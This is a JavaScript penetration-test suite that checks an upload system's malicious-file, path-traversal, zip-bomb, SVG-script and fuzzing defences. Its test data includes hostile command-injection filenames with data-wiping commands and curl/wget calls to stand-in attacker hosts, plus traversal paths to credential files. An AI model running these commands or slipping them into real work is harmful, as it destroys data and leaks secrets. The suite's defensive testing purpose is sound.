const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');

/**
 * Security Penetration Testing Suite
 * Tests the system against various attack vectors
 */
class SecurityPenetrationTests {
  constructor(dependencies = {}) {
    this.maliciousDetector = dependencies.maliciousDetector;
    this.formatEnforcer = dependencies.formatEnforcer;
    this.resourceLimiter = dependencies.resourceLimiter;
    this.testOutputDir = path.join(__dirname, '../../temp/security-tests');
  }

  async runAllTests() {
    const results = {
      passed: 0,
      failed: 0,
      details: []
    };

    console.log('🔍 Starting Security Penetration Tests...\n');

    const testSuites = [
      'testMaliciousFileUploads',
      'testResourceExhaustionAttacks', 
      'testPathTraversalAttacks',
      'testCodeInjectionAttacks',
      'testPolyglotFiles',
      'testZipBombDetection',
      'testSvgScriptInjection',
      'testSteganographyDetection',
      'testBufferOverflowAttempts',
      'testFuzzingAttacks'
    ];

    for (const testSuite of testSuites) {
      try {
        console.log(`Running ${testSuite}...`);
        const result = await this[testSuite]();
        if (result.passed) {
          results.passed++;
          console.log(`✅ ${testSuite}: PASSED`);
        } else {
          results.failed++;
          console.log(`❌ ${testSuite}: FAILED - ${result.reason}`);
        }
        results.details.push(result);
      } catch (error) {
        results.failed++;
        console.log(`💥 ${testSuite}: ERROR - ${error.message}`);
        results.details.push({
          test: testSuite,
          passed: false,
          reason: error.message
        });
      }
    }

    return results;
  }

  async testMaliciousFileUploads() {
    const maliciousFiles = [
      { name: 'fake-jpeg.jpg', content: 'Not a real JPEG file' },
      { name: 'oversized.jpg', content: Buffer.alloc(100 * 1024 * 1024, 'A') }, // 100MB
      { name: '../../../etc/passwd.jpg', content: 'Path traversal attempt' }
    ];

    for (const file of maliciousFiles) {
      const filePath = await this.createTestFile(file.name, file.content);
      
      try {
        const result = await this.formatEnforcer.enforceWhitelist(filePath);
        if (result.allowed) {
          return { 
            test: 'testMaliciousFileUploads', 
            passed: false, 
            reason: `Malicious file ${file.name} was incorrectly allowed` 
          };
        }
      } catch {
        // Expected to fail - this is good
      }
    }

    return { test: 'testMaliciousFileUploads', passed: true };
  }

  async testResourceExhaustionAttacks() {
    // Test memory exhaustion
    const largeOperation = async () => {
      // Simulate memory-intensive operation
      const data = Buffer.alloc(1024 * 1024 * 1024, 'A'); // 1GB
      await new Promise(resolve => setTimeout(resolve, 100));
      return data;
    };

    try {
      await this.resourceLimiter.withResourceLimits(largeOperation, {
        maxMemory: 512 * 1024 * 1024, // 512MB limit
        maxCpuTime: 1000 // 1 second
      });
      return { 
        test: 'testResourceExhaustionAttacks', 
        passed: false, 
        reason: 'Resource limits not enforced' 
      };
    } catch (error) {
      if (error.message.includes('Memory limit exceeded') || 
          error.message.includes('CPU time limit exceeded')) {
        return { test: 'testResourceExhaustionAttacks', passed: true };
      }
      return { 
        test: 'testResourceExhaustionAttacks', 
        passed: false, 
        reason: `Unexpected error: ${error.message}` 
      };
    }
  }

  testPathTraversalAttacks() {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\drivers\\etc\\hosts'
    ];

    // These should all be sanitized and not cause directory traversal
    for (const maliciousPath of maliciousPaths) {
      const sanitized = this.sanitizePath(maliciousPath);
      if (sanitized.includes('..') || sanitized.includes('/etc/') || sanitized.includes('C:\\')) {
        return { 
          test: 'testPathTraversalAttacks', 
          passed: false, 
          reason: `Path traversal not properly sanitized: ${sanitized}` 
        };
      }
    }

    return { test: 'testPathTraversalAttacks', passed: true };
  }

  async testCodeInjectionAttacks() {
    const injectionAttempts = [
      '; rm -rf /',
      '`curl http://evil.com/steal`',
      '$(wget http://malicious.com/payload)',
      '& del /s /q C:\\',
      '|| cat /etc/passwd'
    ];

    // Test that these don't get executed as shell commands
    for (const injection of injectionAttempts) {
      const filename = `test${injection}.jpg`;
      try {
        await this.createTestFile(filename, 'test content');
        // If we got here without executing the injection, it's safe
      } catch (error) {
        if (error.message.includes('Invalid filename') || 
            error.message.includes('Unsafe characters')) {
          // Good - injection was blocked
          continue;
        }
        return { 
          test: 'testCodeInjectionAttacks', 
          passed: false, 
          reason: `Code injection possible: ${injection}` 
        };
      }
    }

    return { test: 'testCodeInjectionAttacks', passed: true };
  }

  async testPolyglotFiles() {
    // Create a file that appears to be both PNG and JPEG
    const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
    const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
    const polyglotContent = Buffer.concat([
      pngHeader,
      Buffer.alloc(100, 0x00),
      jpegHeader,
      Buffer.from('JPEG data here')
    ]);

    const filePath = await this.createTestFile('polyglot.png', polyglotContent);
    
    try {
      const result = await this.formatEnforcer.detectPolyglot(filePath, {});
      if (!result.isPolyglot) {
        return { 
          test: 'testPolyglotFiles', 
          passed: false, 
          reason: 'Polyglot file not detected' 
        };
      }
    } catch (error) {
      return { 
        test: 'testPolyglotFiles', 
        passed: false, 
        reason: `Polyglot detection failed: ${error.message}` 
      };
    }

    return { test: 'testPolyglotFiles', passed: true };
  }

  async testZipBombDetection() {
    // Simulate a ZIP bomb signature
    const zipBombContent = Buffer.from([0x50, 0x4B, 0x03, 0x04]); // ZIP signature
    const filePath = await this.createTestFile('zipbomb.jpg', zipBombContent);

    try {
      const result = await this.maliciousDetector.detectMaliciousContent(filePath);
      if (!result.isMalicious || !result.threats.some(t => t.type === 'zip_bomb')) {
        return { 
          test: 'testZipBombDetection', 
          passed: false, 
          reason: 'ZIP bomb not detected' 
        };
      }
    } catch (error) {
      return { 
        test: 'testZipBombDetection', 
        passed: false, 
        reason: `ZIP bomb detection failed: ${error.message}` 
      };
    }

    return { test: 'testZipBombDetection', passed: true };
  }

  async testSvgScriptInjection() {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert('XSS')</script>
        <circle onclick="evil()" cx="50" cy="50" r="40"/>
      </svg>
    `;

    const filePath = await this.createTestFile('malicious.svg', maliciousSvg);

    try {
      const result = await this.maliciousDetector.detectMaliciousContent(filePath);
      if (!result.isMalicious || !result.threats.some(t => t.type === 'svg_script_injection')) {
        return { 
          test: 'testSvgScriptInjection', 
          passed: false, 
          reason: 'SVG script injection not detected' 
        };
      }
    } catch (error) {
      return { 
        test: 'testSvgScriptInjection', 
        passed: false, 
        reason: `SVG script detection failed: ${error.message}` 
      };
    }

    return { test: 'testSvgScriptInjection', passed: true };
  }

  async testSteganographyDetection() {
    // Create a file with unusual size ratio (large file, small dimensions)
    const highEntropyData = crypto.randomBytes(1024 * 1024); // 1MB of random data
    const filePath = await this.createTestFile('steganography.jpg', highEntropyData);

    try {
      const result = await this.maliciousDetector.detectSteganography(highEntropyData, filePath);
      if (!result.suspicious) {
        return { 
          test: 'testSteganographyDetection', 
          passed: false, 
          reason: 'Steganography indicators not detected' 
        };
      }
    } catch (error) {
      return { 
        test: 'testSteganographyDetection', 
        passed: false, 
        reason: `Steganography detection failed: ${error.message}` 
      };
    }

    return { test: 'testSteganographyDetection', passed: true };
  }

  async testBufferOverflowAttempts() {
    // Create files with extreme sizes and formats to test buffer handling
    const overflowAttempts = [
      Buffer.alloc(10 * 1024 * 1024, 0xFF), // 10MB of 0xFF
      Buffer.alloc(1024, 'AAAA'.repeat(256)), // Pattern that might cause overflow
      Buffer.concat([
        Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), // JPEG header
        Buffer.alloc(50 * 1024 * 1024, 'B') // 50MB payload
      ])
    ];

    for (let i = 0; i < overflowAttempts.length; i++) {
      const filePath = await this.createTestFile(`overflow-${i}.jpg`, overflowAttempts[i]);
      
      try {
        // Test should either handle gracefully or reject properly
        await this.formatEnforcer.enforceWhitelist(filePath);
        // If we get here, ensure it was handled safely
      } catch (error) {
        // Errors are acceptable as long as they're controlled
        if (error.message.includes('segmentation fault') || 
            error.message.includes('heap corruption')) {
          return { 
            test: 'testBufferOverflowAttempts', 
            passed: false, 
            reason: 'Buffer overflow vulnerability detected' 
          };
        }
      }
    }

    return { test: 'testBufferOverflowAttempts', passed: true };
  }

  async testFuzzingAttacks() {
    // Generate random data to test system robustness
    const fuzzingIterations = 10;
    
    for (let i = 0; i < fuzzingIterations; i++) {
      const randomData = crypto.randomBytes(Math.floor(Math.random() * 1024 * 100)); // Up to 100KB
      const filePath = await this.createTestFile(`fuzz-${i}.bin`, randomData);
      
      try {
        // System should handle random data gracefully
        await this.maliciousDetector.detectMaliciousContent(filePath);
        await this.formatEnforcer.enforceWhitelist(filePath);
      } catch (error) {
        // Controlled errors are fine, crashes are not
        if (error.message.includes('segmentation fault') || 
            error.message.includes('fatal error') ||
            error.message.includes('abort')) {
          return { 
            test: 'testFuzzingAttacks', 
            passed: false, 
            reason: `Fuzzing caused system instability: ${error.message}` 
          };
        }
      }
    }

    return { test: 'testFuzzingAttacks', passed: true };
  }

  async createTestFile(filename, content) {
    await this.ensureTestDirectory();
    const safeName = this.sanitizeFilename(filename);
    const filePath = path.join(this.testOutputDir, safeName);
    
    if (Buffer.isBuffer(content)) {
      await fs.writeFile(filePath, content);
    } else {
      await fs.writeFile(filePath, content, 'utf8');
    }
    
    return filePath;
  }

  async ensureTestDirectory() {
    try {
      await fs.access(this.testOutputDir);
    } catch {
      await fs.mkdir(this.testOutputDir, { recursive: true });
    }
  }

  sanitizeFilename(filename) {
    // Remove dangerous characters and path traversal attempts
    return filename
      .replace(/\.{2,}/g, '') // Remove ..
      .replace(/[/\\]/g, '_') // Replace path separators
      .replace(/[<>:"|?*]/g, '_') // Remove other dangerous chars
      .substring(0, 100); // Limit length
  }

  sanitizePath(inputPath) {
    // Basic path sanitization (would be more comprehensive in real implementation)
    return path.normalize(inputPath)
      .replace(/\.\./g, '')
      .replace(/^\/+/, '')
      .replace(/^[A-Z]:\\/i, '');
  }

  async cleanup() {
    try {
      await fs.rmdir(this.testOutputDir, { recursive: true });
    } catch (error) {
      console.warn(`Cleanup warning: ${error.message}`);
    }
  }
}

module.exports = SecurityPenetrationTests;